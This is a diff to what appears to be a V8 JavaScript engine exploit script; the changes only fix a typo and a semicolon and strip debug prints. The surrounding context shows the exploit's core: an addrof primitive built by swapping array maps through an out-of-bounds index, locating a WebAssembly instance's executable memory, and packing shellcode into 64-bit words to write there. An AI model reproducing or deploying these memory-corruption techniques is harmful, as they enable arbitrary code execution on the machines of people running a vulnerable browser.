@@ -81,7 +81,7 @@ var obj_arr_map = ftoi(a[obj_arr_index]) & 0xffffffffn;
 var obj_arr_upper = ftoi(a[obj_arr_index]) & 0xffffffff00000000n; 
 
 // Our addrof function places the object in obj_arr, switches the map to the float one (thus returning the addr as a float)
-// Afterwards, make sure to clean up, just to be save
+// Afterwards, make sure to clean up, just to be safe
 function addrof(o) {
   obj_arr[0] = o;
   a[obj_arr_index] = itof(obj_arr_upper | float_arr_map);
@@ -128,7 +128,7 @@ var wasm_instance = new WebAssembly.Instance(wasm_mod);
 var f = wasm_instance.exports.main;
 
 var wasm_inst_addr = addrof(wasm_instance) - 1n;
-var targ_addr = wasm_inst_addr + 0x68n
+var targ_addr = wasm_inst_addr + 0x68n;
 
 
 // For whatever reason, the wasm_instance can be aligned on something other than 16 bytes
@@ -158,8 +158,6 @@ while(shellcode.length % 8 != 0) {
     shellcode.push(0x90);
 }
 
-print("Foo");
-
 var payload = [];
 for (let i = 0; i < shellcode.length; i++) {
     u8_buf[ (i % 8) ] = shellcode[i];
@@ -168,15 +166,6 @@ for (let i = 0; i < shellcode.length; i++) {
     }
 
 }
-
-// while(payload.length % 4 != 0) {
-//   payload.push(0x9090909090909090n);
-// }
-
-print("Bar", payload.length);
-print(payload);
-//Breakpoint();
-
 
 var n = 6;
 for(let i = 0; i < payload.length; i+= n){
